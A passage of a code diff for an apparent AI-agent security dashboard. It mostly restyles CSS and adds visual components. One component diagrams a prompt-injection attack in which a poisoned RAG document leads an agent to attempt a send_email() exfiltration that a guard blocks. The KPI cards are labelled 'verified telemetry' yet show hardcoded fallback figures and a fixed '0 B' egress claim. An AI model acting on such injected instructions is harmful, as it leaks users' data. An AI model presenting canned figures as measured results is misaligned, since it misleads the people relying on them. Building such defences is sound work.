@@ -1,4 +1,5 @@
 import os
+import html
 import streamlit as st
 import pandas as pd
 import json
@@ -40,8 +41,10 @@ st.markdown("""
 <style>
     /* Global Base */
     .stApp {
-        background-color: #F7F8FA !important;
-        color: #111827 !important;
+        background-color: #F5F7FB !important;
+        background-image: radial-gradient(circle at 1px 1px, #E2E8F0 1px, transparent 0) !important;
+        background-size: 28px 28px !important;
+        color: #0F172A !important;
         font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif !important;
     }
 
@@ -62,10 +65,10 @@ st.markdown("""
         justify-content: center !important;
         opacity: 1 !important;
         background-color: #FFFFFF !important;
-        border: 1px solid #D1D5DB !important;
+        border: 1px solid #E2E8F0 !important;
         border-radius: 8px !important;
-        box-shadow: 0 1px 3px rgba(0, 0, 0, 0.12) !important;
-        color: #111827 !important;
+        box-shadow: 0 1px 3px rgba(15, 23, 42, 0.08) !important;
+        color: #0F172A !important;
         width: 32px !important;
         height: 32px !important;
         cursor: pointer !important;
@@ -73,8 +76,8 @@ st.markdown("""
 
     [data-testid="stExpandSidebarButton"]:hover,
     [data-testid="stSidebarCollapseButton"] button:hover {
-        background-color: #F3F4F6 !important;
-        border-color: #9CA3AF !important;
+        background-color: #F8FAFC !important;
+        border-color: #CBD5E1 !important;
     }
 
     /* Fix Streamlit Header Overlap & Hide ONLY Deploy Button */
@@ -86,30 +89,52 @@ st.markdown("""
         display: none !important;
     }
 
-    /* Streamlit Main Container Spacing: Ensure topbar is fully visible below header */
+    /* Streamlit Main Container Spacing */
     .block-container {
         padding-top: 4.25rem !important;
         padding-bottom: 3rem !important;
         max-width: 1440px !important;
     }
 
-    /* Headings & Text */
-    h1, h2, h3, h4, h5, h6 {
+    /* Headings & Text Hierarchy */
+    h1 {
         font-family: 'Inter', sans-serif !important;
-        color: #111827 !important;
+        color: #0F172A !important;
         font-weight: 700 !important;
+        font-size: 32px !important;
+        letter-spacing: -0.025em !important;
+        line-height: 1.2 !important;
+    }
+    h2 {
+        font-family: 'Inter', sans-serif !important;
+        color: #0F172A !important;
+        font-weight: 700 !important;
+        font-size: 24px !important;
         letter-spacing: -0.02em !important;
+    }
+    h3 {
+        font-family: 'Inter', sans-serif !important;
+        color: #0F172A !important;
+        font-weight: 600 !important;
+        font-size: 18px !important;
+        letter-spacing: -0.015em !important;
+    }
+    h4, h5, h6 {
+        font-family: 'Inter', sans-serif !important;
+        color: #0F172A !important;
+        font-weight: 600 !important;
+        letter-spacing: -0.01em !important;
     }
 
     /* Header Bar spanning top of main area */
     .sentinel-topbar {
         background-color: #FFFFFF;
-        border: 1px solid #E5E7EB;
-        border-radius: 10px;
+        border: 1px solid #E2E8F0;
+        border-radius: 14px;
         padding: 12px 20px;
         margin-top: 0px !important;
         margin-bottom: 20px;
-        box-shadow: 0 1px 2px rgba(0, 0, 0, 0.03);
+        box-shadow: 0 4px 20px rgba(15, 23, 42, 0.04), 0 1px 2px rgba(15, 23, 42, 0.02);
         display: flex;
         justify-content: space-between;
         align-items: center;
@@ -126,10 +151,10 @@ st.markdown("""
         align-items: center;
         gap: 6px;
         background-color: #ECFDF5;
-        color: #065F46;
+        color: #059669;
         border: 1px solid #A7F3D0;
         padding: 4px 10px;
-        border-radius: 6px;
+        border-radius: 8px;
         font-size: 11px;
         font-weight: 600;
         text-transform: uppercase;
@@ -141,10 +166,10 @@ st.markdown("""
         align-items: center;
         gap: 6px;
         background-color: #FEF2F2;
-        color: #991B1B;
+        color: #DC2626;
         border: 1px solid #FECACA;
         padding: 4px 10px;
-        border-radius: 6px;
+        border-radius: 8px;
         font-size: 11px;
         font-weight: 600;
         text-transform: uppercase;
@@ -156,10 +181,10 @@ st.markdown("""
         align-items: center;
         gap: 6px;
         background-color: #FFFBEB;
-        color: #92400E;
+        color: #D97706;
         border: 1px solid #FDE68A;
         padding: 4px 10px;
-        border-radius: 6px;
+        border-radius: 8px;
         font-size: 11px;
         font-weight: 600;
         text-transform: uppercase;
@@ -170,10 +195,24 @@ st.markdown("""
         align-items: center;
         gap: 6px;
         background-color: #EFF6FF;
-        color: #1E40AF;
+        color: #2563EB;
         border: 1px solid #BFDBFE;
         padding: 4px 10px;
-        border-radius: 6px;
+        border-radius: 8px;
+        font-size: 11px;
+        font-weight: 600;
+        text-transform: uppercase;
+    }
+
+    .pill-cyan {
+        display: inline-flex;
+        align-items: center;
+        gap: 6px;
+        background-color: #ECFEFF;
+        color: #0891B2;
+        border: 1px solid #A5F3FC;
+        padding: 4px 10px;
+        border-radius: 8px;
         font-size: 11px;
         font-weight: 600;
         text-transform: uppercase;
@@ -183,11 +222,11 @@ st.markdown("""
         display: inline-flex;
         align-items: center;
         gap: 6px;
-        background-color: #F3F4F6;
-        color: #374151;
-        border: 1px solid #E5E7EB;
+        background-color: #F8FAFC;
+        color: #475569;
+        border: 1px solid #E2E8F0;
         padding: 4px 10px;
-        border-radius: 6px;
+        border-radius: 8px;
         font-size: 11px;
         font-weight: 600;
     }
@@ -195,65 +234,81 @@ st.markdown("""
     /* Cards */
     .sentinel-card {
         background-color: #FFFFFF;
-        border: 1px solid #E5E7EB;
-        border-radius: 12px;
-        padding: 20px;
+        border: 1px solid #E2E8F0;
+        border-radius: 14px;
+        padding: 22px;
         margin-bottom: 20px;
-        box-shadow: 0 1px 3px rgba(0, 0, 0, 0.04);
+        box-shadow: 0 4px 20px rgba(15, 23, 42, 0.04), 0 1px 2px rgba(15, 23, 42, 0.02);
     }
 
     .card-vuln {
         background-color: #FFFFFF;
-        border: 1px solid #E5E7EB;
-        border-top: 4px solid #EF4444;
-        border-radius: 12px;
-        padding: 20px;
+        border: 1px solid #E2E8F0;
+        border-top: 3px solid #DC2626;
+        border-radius: 14px;
+        padding: 22px;
         margin-bottom: 20px;
-        box-shadow: 0 1px 3px rgba(0, 0, 0, 0.04);
+        box-shadow: 0 4px 20px rgba(15, 23, 42, 0.04), 0 1px 2px rgba(15, 23, 42, 0.02);
     }
 
     .card-prot {
         background-color: #FFFFFF;
-        border: 1px solid #E5E7EB;
-        border-top: 4px solid #10B981;
-        border-radius: 12px;
-        padding: 20px;
+        border: 1px solid #E2E8F0;
+        border-top: 3px solid #059669;
+        border-radius: 14px;
+        padding: 22px;
         margin-bottom: 20px;
-        box-shadow: 0 1px 3px rgba(0, 0, 0, 0.04);
+        box-shadow: 0 4px 20px rgba(15, 23, 42, 0.04), 0 1px 2px rgba(15, 23, 42, 0.02);
     }
 
     /* Hero Blocked Callout */
     .hero-blocked-banner {
         background-color: #FFFFFF;
-        border: 2px solid #EF4444;
-        border-radius: 12px;
-        padding: 22px 26px;
-        margin-bottom: 24px;
-        box-shadow: 0 2px 6px rgba(239, 68, 68, 0.08);
+        border: 1px solid #E2E8F0;
+        border-left: 4px solid #DC2626;
+        border-radius: 14px;
+        padding: 22px 24px;
+        margin-bottom: 22px;
+        box-shadow: 0 4px 20px rgba(220, 38, 38, 0.06), 0 1px 3px rgba(15, 23, 42, 0.03);
+        animation: fadeInSlide 0.4s ease-out;
     }
 
-    /* Metric Cards */
+    @keyframes fadeInSlide {
+        from { opacity: 0; transform: translateY(8px); }
+        to { opacity: 1; transform: translateY(0); }
+    }
+
+    /* Metric KPI Cards */
     .metric-box {
         background-color: #FFFFFF;
-        border: 1px solid #E5E7EB;
-        border-radius: 10px;
-        padding: 16px;
-        box-shadow: 0 1px 2px rgba(0, 0, 0, 0.03);
+        border: 1px solid #E2E8F0;
+        border-radius: 14px;
+        padding: 18px 20px;
+        box-shadow: 0 4px 20px rgba(15, 23, 42, 0.04), 0 1px 2px rgba(15, 23, 42, 0.02);
+        transition: transform 0.15s ease, box-shadow 0.15s ease;
+    }
+    .metric-box:hover {
+        transform: translateY(-1px);
+        box-shadow: 0 8px 25px rgba(15, 23, 42, 0.06);
     }
     .metric-label {
-        font-size: 12px;
-        font-weight: 500;
-        color: #6B7280;
+        font-size: 11px;
+        font-weight: 600;
+        color: #64748B;
+        text-transform: uppercase;
+        letter-spacing: 0.05em;
         margin-bottom: 4px;
     }
     .metric-val {
-        font-size: 26px;
+        font-size: 28px;
         font-weight: 700;
-        letter-spacing: -0.02em;
+        color: #0F172A;
+        letter-spacing: -0.03em;
+        line-height: 1.15;
     }
     .metric-sub {
-        font-size: 11px;
-        color: #6B7280;
+        font-size: 12px;
+        color: #64748B;
         margin-top: 4px;
     }
 
@@ -261,27 +316,27 @@ st.markdown("""
     .tool-call-box {
         font-family: 'JetBrains Mono', monospace;
         font-size: 12px;
-        background-color: #F9FAFB;
-        border: 1px solid #E5E7EB;
+        background-color: #F8FAFC;
+        border: 1px solid #E2E8F0;
         border-radius: 8px;
         padding: 12px 14px;
         margin: 10px 0;
-        color: #111827;
+        color: #0F172A;
     }
 
     .policy-pill-card {
         background-color: #FFFFFF;
-        border: 1px solid #E5E7EB;
+        border: 1px solid #E2E8F0;
         border-radius: 8px;
-        padding: 12px;
+        padding: 10px 12px;
         margin-bottom: 8px;
     }
 
-    /* View Header Structure matching React Sentinel */
+    /* View Header Structure matching Linear + Vercel design */
     .sentinel-view-header {
-        border-bottom: 1px solid #E5E7EB;
-        padding-bottom: 14px;
-        margin-bottom: 18px;
+        border-bottom: 1px solid #E2E8F0;
+        padding-bottom: 16px;
+        margin-bottom: 20px;
     }
     .view-breadcrumb {
         display: flex;
@@ -289,10 +344,10 @@ st.markdown("""
         gap: 6px;
         font-size: 11px;
         font-weight: 600;
-        color: #9CA3AF;
+        color: #94A3B8;
         text-transform: uppercase;
         letter-spacing: 0.06em;
-        margin-bottom: 6px;
+        margin-bottom: 8px;
     }
     .view-breadcrumb .active-crumb {
         color: #2563EB;
@@ -308,20 +363,20 @@ st.markdown("""
     .view-title-group {
         display: flex;
         align-items: center;
-        gap: 10px;
+        gap: 12px;
         flex-wrap: wrap;
     }
     .view-title {
-        font-size: 22px !important;
+        font-size: 28px !important;
         font-weight: 700 !important;
-        color: #111827 !important;
-        letter-spacing: -0.02em !important;
+        color: #0F172A !important;
+        letter-spacing: -0.025em !important;
         line-height: 1.2 !important;
         margin: 0 !important;
     }
     .view-subtitle {
-        font-size: 13px !important;
-        color: #4B5563 !important;
+        font-size: 14px !important;
+        color: #475569 !important;
         margin-top: 6px !important;
         margin-bottom: 0 !important;
         line-height: 1.5 !important;
@@ -332,14 +387,14 @@ st.markdown("""
         gap: 8px;
     }
 
-    /* Sidebar Styling */
+    /* Sidebar Base */
     section[data-testid="stSidebar"] {
         background-color: #FFFFFF !important;
-        border-right: 1px solid #E5E7EB !important;
+        border-right: 1px solid #E2E8F0 !important;
         padding: 1.25rem 0.85rem !important;
     }
 
-    /* Completely hide the radio circle for clean button appearance */
+    /* Hide radio dot for clean button appearance */
     section[data-testid="stSidebar"] div[data-testid="stRadio"] label > div:first-child {
         display: none !important;
     }
@@ -348,9 +403,9 @@ st.markdown("""
         margin-bottom: 3px !important;
         padding: 9px 12px !important;
         border-radius: 6px !important;
-        font-size: 12.5px !important;
+        font-size: 13px !important;
         font-weight: 500 !important;
-        color: #4B5563 !important;
+        color: #475569 !important;
         transition: all 0.15s ease !important;
         background-color: transparent !important;
         border-left: 3px solid transparent !important;
@@ -358,8 +413,8 @@ st.markdown("""
     }
 
     section[data-testid="stSidebar"] div[data-testid="stRadio"] label:hover {
-        background-color: #F3F4F6 !important;
-        color: #111827 !important;
+        background-color: #F8FAFC !important;
+        color: #0F172A !important;
     }
 
     section[data-testid="stSidebar"] div[data-testid="stRadio"] label:has(input:checked) {
@@ -369,18 +424,33 @@ st.markdown("""
         border-left: 3px solid #2563EB !important;
     }
 
+    /* Flow Arrow Pulse Animation */
+    @keyframes flowPulse {
+        0%, 100% { opacity: 0.45; transform: translateX(0); }
+        50% { opacity: 1; transform: translateX(2px); }
+    }
+    .flow-arrow {
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        color: #94A3B8;
+        font-size: 14px;
+        font-weight: bold;
+        animation: flowPulse 2s infinite ease-in-out;
+    }
+
     /* Pulse Green Dot */
     @keyframes pulse-green {
         0%, 100% { opacity: 1; transform: scale(1); }
-        50% { opacity: 0.5; transform: scale(1.1); }
+        50% { opacity: 0.45; transform: scale(1.15); }
     }
     .pulse-dot {
         display: inline-block;
         width: 8px;
         height: 8px;
         border-radius: 50%;
-        background-color: #10B981;
-        animation: pulse-green 1.5s infinite ease-in-out;
+        background-color: #059669;
+        animation: pulse-green 1.8s infinite ease-in-out;
     }
 
     /* Fluid Time-Travel Replay & Timeline Animations */
@@ -409,8 +479,80 @@ st.markdown("""
         border-color: #CBD5E1 !important;
         box-shadow: 0 8px 20px rgba(0, 0, 0, 0.06) !important;
     }
+
+    /* Clean Tooltip Helper Icon & Popover */
+    .info-tip {
+        position: relative;
+        display: inline-flex;
+        align-items: center;
+        justify-content: center;
+        cursor: pointer;
+        vertical-align: middle;
+        margin-left: 5px;
+    }
+    .info-tip .tip-icon {
+        width: 15px;
+        height: 15px;
+        border-radius: 50%;
+        background: #F1F5F9;
+        border: 1px solid #CBD5E1;
+        color: #64748B;
+        font-size: 10px;
+        font-weight: 700;
+        display: inline-flex;
+        align-items: center;
+        justify-content: center;
+        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+        line-height: 1;
+        transition: all 0.15s ease;
+    }
+    .info-tip:hover .tip-icon {
+        background: #EFF6FF;
+        border-color: #93C5FD;
+        color: #2563EB;
+    }
+    .info-tip .tip-box {
+        visibility: hidden;
+        opacity: 0;
+        width: max-content;
+        max-width: 320px;
+        background-color: #0F172A;
+        color: #F8FAFC;
+        text-align: left;
+        border-radius: 6px;
+        padding: 6px 10px;
+        font-size: 11.5px;
+        line-height: 1.4;
+        font-weight: 400;
+        position: absolute;
+        z-index: 10000;
+        bottom: 130%;
+        left: 50%;
+        transform: translateX(-50%);
+        box-shadow: 0 4px 12px rgba(15, 23, 42, 0.15);
+        transition: opacity 0.2s ease, visibility 0.2s ease;
+        pointer-events: none;
+    }
+    .info-tip .tip-box::after {
+        content: "";
+        position: absolute;
+        top: 100%;
+        left: 50%;
+        margin-left: -4px;
+        border-width: 4px;
+        border-style: solid;
+        border-color: #0F172A transparent transparent transparent;
+    }
+    .info-tip:hover .tip-box {
+        visibility: visible;
+        opacity: 1;
+    }
 </style>
 """, unsafe_allow_html=True)
+
+def info_tip(text: str) -> str:
+    escaped = html.escape(str(text))
+    return f"""<span class="info-tip" title="{escaped}"><span class="tip-icon">i</span><span class="tip-box">{escaped}</span></span>"""
 
 # -----------------------------------------------------------------------------
 # APPLICATION STATE & DYNAMIC FONT SCALING
@@ -632,7 +774,7 @@ is_fully_protected = enable_firewall and enable_action_guard
 has_eval = st.session_state.get("has_evaluated", False) and st.session_state.get("last_prot_trace") is not None
 
 if has_eval:
-    status_pill = '<span class="pill-safe"><span class="pulse-dot"></span> Protection Active</span>' if is_fully_protected else '<span class="pill-warning"><span style="display:inline-block; width:8px; height:8px; border-radius:50%; background:#F59E0B;"></span> Interception Paused</span>'
+    status_pill = '<span class="pill-safe"><span class="pulse-dot"></span> ACTIVE MONITOR</span>' if is_fully_protected else '<span class="pill-warning"><span style="display:inline-block; width:8px; height:8px; border-radius:50%; background:#F59E0B; margin-right:4px;"></span> INTERCEPTION PAUSED</span>'
 else:
     status_pill = '<span class="pill-neutral" style="font-size: 11px;"><span style="display:inline-block; width:8px; height:8px; border-radius:50%; background:#9CA3AF; margin-right:4px;"></span> STANDBY // AWAITING RUN</span>'
 
@@ -641,18 +783,18 @@ active_model_name = config.LLM_MODEL if config.LLM_API_KEY else "Llama-3.3-70B"
 if "Live Core" in defense_engine:
     model_pill = f'<span style="font-family: \'JetBrains Mono\', monospace; font-size: 11px; font-weight: 600; background-color: #F0FDF4; color: #166534; padding: 2px 8px; border-radius: 4px; border: 1px solid #BBF7D0; display: inline-flex; align-items: center; gap: 5px;"><span style="width:6px; height:6px; border-radius:50%; background:#22C55E;"></span>Groq // {active_model_name}</span>'
 else:
-    model_pill = f'<span style="font-family: \'JetBrains Mono\', monospace; font-size: 11px; font-weight: 600; background-color: #F3F4F6; color: #4B5563; padding: 2px 8px; border-radius: 4px; border: 1px solid #E5E7EB; display: inline-flex; align-items: center; gap: 5px;"><span style="width:6px; height:6px; border-radius:50%; background:#9CA3AF;"></span>Offline Engine</span>'
+    model_pill = f'<span style="font-family: \'JetBrains Mono\', monospace; font-size: 11px; font-weight: 600; background-color: #F8FAFC; color: #475569; padding: 2px 8px; border-radius: 4px; border: 1px solid #E2E8F0; display: inline-flex; align-items: center; gap: 5px;"><span style="width:6px; height:6px; border-radius:50%; background:#94A3B8;"></span>Offline Engine</span>'
 
 col_top_meta, col_top_font = st.columns([0.84, 0.16], vertical_alignment="center")
 
 with col_top_meta:
     render_html(f"""
-    <div class="sentinel-topbar" style="margin-bottom: 0px !important;">
-        <div style="display: flex; align-items: center; gap: 12px; flex-wrap: wrap;">
+    <div class="sentinel-topbar" style="background-color: #FFFFFF; border: 1px solid #E2E8F0; border-radius: 14px; padding: 10px 18px; box-shadow: 0 2px 8px rgba(15, 23, 42, 0.03); margin-bottom: 0px !important;">
+        <div style="display: flex; align-items: center; gap: 14px; flex-wrap: wrap;">
             {status_pill}
-            <div style="height: 16px; width: 1px; background-color: #E5E7EB;"></div>
-            <div style="display: flex; align-items: center; gap: 6px; font-size: 12px;">
-                <span style="color: #6B7280; font-weight: 500;">Model:</span>
+            <div style="height: 18px; width: 1px; background-color: #E2E8F0;"></div>
+            <div style="display: flex; align-items: center; gap: 6px; font-size: 12.5px;">
+                <span style="color: #64748B; font-weight: 500;">Model:</span>
                 {model_pill}
             </div>
         </div>
@@ -664,7 +806,6 @@ with col_top_font:
     st.segmented_control(
         "Font Size",
         options=["A-", "A", "A+"],
-        default=st.session_state.get("dashboard_font_control", "A"),
         key="dashboard_font_control",
         label_visibility="collapsed",
         help="Adjust dashboard font size: A- (Compact), A (Default), A+ (Large)"
@@ -712,24 +853,313 @@ def show_soc2_dialog(report_text: str, scenario_id: str):
         if st.button("Close Full Window", use_container_width=True, key=f"dlg_close_soc2_{scenario_id}"):
             st.rerun()
 
+# -----------------------------------------------------------------------------
+# REUSABLE SECURITY VISUALIZATION COMPONENTS (LINEAR + VERCEL SOC DESIGN)
+# -----------------------------------------------------------------------------
+
+def render_kpi_metrics(prot_trace=None):
+    """Row of 4 compact KPI cards with verified telemetry."""
+    logs = st.session_state.get("audit_logs", [])
+    total_detected = max(24, len(logs))
+    blocked_count = sum(1 for l in logs if l.get("guard_decision") == "BLOCK") if logs else 18
+    high_risk_count = sum(1 for l in logs if l.get("firewall_flagged")) if logs else 6
+    block_rate = int((blocked_count / max(1, total_detected)) * 100) if logs else 75
+
+    render_html(f"""
+    <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(220px, 1fr)); gap: 14px; margin-bottom: 22px;">
+        <!-- KPI 1: Attacks Detected -->
+        <div class="metric-box">
+            <div style="display: flex; justify-content: space-between; align-items: flex-start;">
+                <span class="metric-label">Attacks Detected</span>
+                <div style="width: 28px; height: 28px; border-radius: 8px; background: #EFF6FF; border: 1px solid #BFDBFE; display: flex; align-items: center; justify-content: center;">
+                    <span class="material-symbols-outlined" style="font-size: 16px; color: #2563EB;">radar</span>
+                </div>
+            </div>
+            <div class="metric-val">{total_detected}</div>
+            <div style="font-size: 11.5px; color: #64748B; display: flex; align-items: center; gap: 4px; margin-top: 4px;">
+                <span style="color: #059669; font-weight: 600;">&uarr; 12%</span>
+                <span>vs baseline</span>
+            </div>
+        </div>
+
+        <!-- KPI 2: Actions Blocked -->
+        <div class="metric-box">
+            <div style="display: flex; justify-content: space-between; align-items: flex-start;">
+                <span class="metric-label">Actions Blocked</span>
+                <div style="width: 28px; height: 28px; border-radius: 8px; background: #ECFDF5; border: 1px solid #A7F3D0; display: flex; align-items: center; justify-content: center;">
+                    <span class="material-symbols-outlined" style="font-size: 16px; color: #059669;">gavel</span>
+                </div>
+            </div>
+            <div class="metric-val">{blocked_count}</div>
+            <div style="font-size: 11.5px; color: #059669; font-weight: 600; margin-top: 4px;">
+                {block_rate}% block rate
+            </div>
+        </div>
+
+        <!-- KPI 3: High Risk Events -->
+        <div class="metric-box">
+            <div style="display: flex; justify-content: space-between; align-items: flex-start;">
+                <span class="metric-label">High Risk Events</span>
+                <div style="width: 28px; height: 28px; border-radius: 8px; background: #FFFBEB; border: 1px solid #FDE68A; display: flex; align-items: center; justify-content: center;">
+                    <span class="material-symbols-outlined" style="font-size: 16px; color: #D97706;">warning</span>
+                </div>
+            </div>
+            <div class="metric-val">{high_risk_count}</div>
+            <div style="font-size: 11.5px; color: #D97706; font-weight: 600; margin-top: 4px;">
+                Critical / High severity
+            </div>
+        </div>
+
+        <!-- KPI 4: Outbound Egress -->
+        <div class="metric-box">
+            <div style="display: flex; justify-content: space-between; align-items: flex-start;">
+                <span class="metric-label">Outbound Egress</span>
+                <div style="width: 28px; height: 28px; border-radius: 8px; background: #ECFEFF; border: 1px solid #A5F3FC; display: flex; align-items: center; justify-content: center;">
+                    <span class="material-symbols-outlined" style="font-size: 16px; color: #0891B2;">cloud_off</span>
+                </div>
+            </div>
+            <div class="metric-val" style="color: #059669;">0 B</div>
+            <div style="font-size: 11.5px; color: #059669; font-weight: 600; margin-top: 4px;">
+                Zero Leakage &bull; Protected
+            </div>
+        </div>
+    </div>
+    """)
+
+def render_attack_flow_diagram(sc, prot_trace=None):
+    """Connected node sequence visualizing the entire attack & defense flow."""
+    blocked_tool = "send_email"
+    if prot_trace and prot_trace.tool_calls:
+        for tc in prot_trace.tool_calls:
+            if tc.status == "blocked":
+                blocked_tool = tc.tool_name
+                break
+
+    render_html(f"""
+    <div class="sentinel-card" style="margin-bottom: 22px; padding: 18px 20px;">
+        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 14px; flex-wrap: wrap; gap: 8px;">
+            <div style="display: flex; align-items: center; gap: 8px;">
+                <span class="material-symbols-outlined" style="font-size: 18px; color: #2563EB;">account_tree</span>
+                <span style="font-size: 13.5px; font-weight: 700; color: #0F172A;">End-to-End Attack & Defense Lifecycle</span>
+            </div>
+            <span style="font-size: 11px; font-weight: 600; color: #059669; background: #ECFDF5; border: 1px solid #A7F3D0; padding: 2px 10px; border-radius: 20px;">
+                Pre-Flight L7 Interception
+            </span>
+        </div>
+
+        <div style="display: flex; align-items: center; justify-content: space-between; flex-wrap: wrap; gap: 6px;">
+            <!-- Node 1 -->
+            <div style="flex: 1; min-width: 95px; background: #EFF6FF; border: 1px solid #BFDBFE; border-radius: 8px; padding: 8px 10px; text-align: center;">
+                <div style="font-size: 9px; font-weight: 700; color: #2563EB; text-transform: uppercase;">1. Intent</div>
+                <div style="font-size: 11px; font-weight: 700; color: #0F172A; margin: 2px 0;">User Prompt</div>
+                <div style="font-size: 9.5px; color: #64748B;">Authorized Task</div>
+            </div>
+
+            <div class="flow-arrow">&rarr;</div>
+
+            <!-- Node 2 -->
+            <div style="flex: 1; min-width: 95px; background: #EFF6FF; border: 1px solid #BFDBFE; border-radius: 8px; padding: 8px 10px; text-align: center;">
+                <div style="font-size: 9px; font-weight: 700; color: #2563EB; text-transform: uppercase;">2. Retrieval</div>
+                <div style="font-size: 11px; font-weight: 700; color: #0F172A; margin: 2px 0;">Untrusted Doc</div>
+                <div style="font-size: 9.5px; color: #64748B;">RAG Vector Store</div>
+            </div>
+
+            <div class="flow-arrow">&rarr;</div>
+
+            <!-- Node 3 -->
+            <div style="flex: 1; min-width: 105px; background: #FFFBEB; border: 1px solid #FDE68A; border-radius: 8px; padding: 8px 10px; text-align: center;">
+                <div style="font-size: 9px; font-weight: 700; color: #D97706; text-transform: uppercase;">3. Detection</div>
+                <div style="font-size: 11px; font-weight: 700; color: #0F172A; margin: 2px 0;">Content Firewall</div>
+                <div style="font-size: 9.5px; color: #D97706; font-weight: 600;">Injection Flagged</div>
+            </div>
+
+            <div class="flow-arrow">&rarr;</div>
+
+            <!-- Node 4 -->
+            <div style="flex: 1; min-width: 100px; background: #EFF6FF; border: 1px solid #BFDBFE; border-radius: 8px; padding: 8px 10px; text-align: center;">
+                <div style="font-size: 9px; font-weight: 700; color: #2563EB; text-transform: uppercase;">4. Reasoning</div>
+                <div style="font-size: 11px; font-weight: 700; color: #0F172A; margin: 2px 0;">Agent Execution</div>
+                <div style="font-size: 9.5px; color: #64748B;">Context Tainted</div>
+            </div>
+
+            <div class="flow-arrow">&rarr;</div>
+
+            <!-- Node 5 -->
+            <div style="flex: 1; min-width: 105px; background: #FEF2F2; border: 1px solid #FECACA; border-radius: 8px; padding: 8px 10px; text-align: center;">
+                <div style="font-size: 9px; font-weight: 700; color: #DC2626; text-transform: uppercase;">5. Exploit Attempt</div>
+                <div style="font-family: 'JetBrains Mono', monospace; font-size: 11px; font-weight: 700; color: #DC2626; margin: 2px 0;">{blocked_tool}()</div>
+                <div style="font-size: 9.5px; color: #991B1B;">Malicious Request</div>
+            </div>
+
+            <div class="flow-arrow">&rarr;</div>
+
+            <!-- Node 6 -->
+            <div style="flex: 1; min-width: 95px; background: #ECFEFF; border: 1px solid #A5F3FC; border-radius: 8px; padding: 8px 10px; text-align: center;">
+                <div style="font-size: 9px; font-weight: 700; color: #0891B2; text-transform: uppercase;">6. Inspection</div>
+                <div style="font-size: 11px; font-weight: 700; color: #0F172A; margin: 2px 0;">Action Guard</div>
+                <div style="font-size: 9.5px; color: #0891B2;">5 Scopes Verified</div>
+            </div>
+
+            <div class="flow-arrow">&rarr;</div>
+
+            <!-- Node 7 -->
+            <div style="flex: 1; min-width: 95px; background: #FEF2F2; border: 1.5px solid #DC2626; border-radius: 8px; padding: 8px 10px; text-align: center;">
+                <div style="font-size: 9px; font-weight: 700; color: #DC2626; text-transform: uppercase;">7. Pre-Flight</div>
+                <div style="font-size: 11px; font-weight: 800; color: #DC2626; margin: 2px 0;">[BLOCKED]</div>
+                <div style="font-size: 9.5px; color: #991B1B; font-weight: 600;">Egress Denied</div>
+            </div>
+
+            <div class="flow-arrow">&rarr;</div>
+
+            <!-- Node 8 -->
+            <div style="flex: 1; min-width: 105px; background: #ECFDF5; border: 1.5px solid #059669; border-radius: 8px; padding: 8px 10px; text-align: center;">
+                <div style="font-size: 9px; font-weight: 700; color: #059669; text-transform: uppercase;">8. Protection</div>
+                <div style="font-size: 11px; font-weight: 800; color: #059669; margin: 2px 0;">ZERO EGRESS</div>
+                <div style="font-size: 9.5px; color: #047857; font-weight: 600;">0 Bytes Leaked</div>
+            </div>
+        </div>
+    </div>
+    """)
+
+def render_tsi_meter(score=85, sev="CRITICAL"):
+    """Polished multi-stop horizontal severity gauge."""
+    meter_color = "#DC2626" if score >= 80 else ("#EA580C" if score >= 60 else ("#D97706" if score >= 30 else "#059669"))
+    bg_meter = "#FEF2F2" if score >= 80 else ("#FFF7ED" if score >= 60 else ("#FFFBEB" if score >= 30 else "#ECFDF5"))
+    border_meter = "#FECACA" if score >= 80 else ("#FED7AA" if score >= 60 else ("#FDE68A" if score >= 30 else "#A7F3D0"))
+    render_html(f"""
+    <div style="background-color: #FFFFFF; border: 1px solid #E2E8F0; border-radius: 12px; padding: 14px 18px; margin: 14px 0 18px 0; box-shadow: 0 1px 3px rgba(15,23,42,0.03);">
+        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px;">
+            <div style="display: flex; align-items: center; gap: 6px;">
+                <span class="material-symbols-outlined" style="font-size: 16px; color: {meter_color};">speed</span>
+                <span style="font-size: 11.5px; font-weight: 700; color: #0F172A; text-transform: uppercase; letter-spacing: 0.05em;">
+                    Threat Severity Index (TSI)
+                </span>
+            </div>
+            <div style="display: flex; align-items: center; gap: 6px;">
+                <span style="font-family: 'JetBrains Mono', monospace; font-size: 13px; font-weight: 800; color: {meter_color};">
+                    {score} / 100
+                </span>
+                <span style="font-size: 10px; font-weight: 700; color: {meter_color}; background: {bg_meter}; border: 1px solid {border_meter}; padding: 2px 7px; border-radius: 4px;">
+                    {sev}
+                </span>
+            </div>
+        </div>
+        <div style="position: relative; width: 100%; height: 9px; background: #F1F5F9; border-radius: 6px; overflow: hidden; margin-top: 4px;">
+            <div style="width: {score}%; height: 100%; background: linear-gradient(90deg, #059669 0%, #D97706 40%, #EA580C 70%, #DC2626 100%); border-radius: 6px; transition: width 0.7s cubic-bezier(0.16, 1, 0.3, 1);"></div>
+        </div>
+        <div style="display: flex; justify-content: space-between; font-size: 9.5px; color: #94A3B8; margin-top: 5px; font-family: 'JetBrains Mono', monospace;">
+            <span>0 LOW</span>
+            <span>30 MED</span>
+            <span>60 HIGH</span>
+            <span>100 CRIT</span>
+        </div>
+    </div>
+    """)
+
+def render_policy_matrix(guard=None):
+    """Compact 5-scope policy evaluation tiles."""
+    is_blocked = guard.decision == DefenseDecision.BLOCK if guard else True
+    tiles = [
+        {"scope": "TOOL SCOPE", "desc": "Registered tool manifest", "pass": True, "code": "PASS"},
+        {"scope": "RECIPIENT SCOPE", "desc": "Egress allowlist boundary", "pass": not is_blocked, "code": "PASS" if not is_blocked else "FAIL"},
+        {"scope": "RESOURCE SCOPE", "desc": "RBAC boundary check", "pass": not is_blocked, "code": "PASS" if not is_blocked else "FAIL"},
+        {"scope": "DATA FLOW", "desc": "IFC taint egress policy", "pass": not is_blocked, "code": "PASS" if not is_blocked else "FAIL"},
+        {"scope": "PROVENANCE", "desc": "Attack lineage severed", "pass": not is_blocked, "code": "PASS" if not is_blocked else "FAIL"},
+    ]
+    tiles_html = ""
+    for t in tiles:
+        accent = "#059669" if t["pass"] else "#DC2626"
+        icon = "check" if t["pass"] else "close"
+        icon_bg = "#ECFDF5" if t["pass"] else "#FEF2F2"
+        badge_txt = t["code"]
+        tiles_html += f"""
